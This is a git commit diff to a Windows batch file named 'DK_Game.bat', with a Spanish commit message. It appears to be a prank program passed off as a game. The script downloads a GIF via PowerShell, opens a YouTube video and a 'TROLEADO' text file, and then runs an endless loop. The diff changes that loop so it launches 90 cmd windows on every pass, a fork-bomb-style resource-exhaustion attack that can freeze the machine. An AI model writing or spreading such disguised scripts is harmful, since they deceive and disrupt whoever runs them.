a36272d56e40c0b9dc5f86f9cb67c5150398dac3
MarMDps2 <marcosmoldel@gmail.com>
2025-02-17 09:35:06 +0100

    abre el navegador por defecto y modifico el cmd para que abra 90 constantemente

--- DK_Game.bat
+++ DK_Game.bat
@@ -13,11 +13,11 @@ set "script_dir=%~dp0"
 powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://media.tenor.com/mcPlflbf1p0AAAAM/monkey-deal-with-it.gif', '%script_dir%imagen.gif')"
 echo ¡¡¡¡¡¡¡¡¡¡¡¡¡TROLEADO!!!!!!!!!!!!!! > "%script_dir%Troliado.txt"
 start "" "%script_dir%imagen.gif"
-start "" "C:\Program Files\Google\Chrome\Application\chrome.exe" "https://www.youtube.com/watch?v=I8p89Xun5L0&ab_channel=Player2"
+start "" "https://www.youtube.com/watch?v=I8p89Xun5L0&ab_channel=Player2"
 timeout /t 2
 start notepad "%script_dir%Troliado.txt"
 timeout /t 30
 timeout /t 1
 :loop
-start "90" cmd.exe
+for /l %%i in (1,1,90) do start cmd
 goto loop
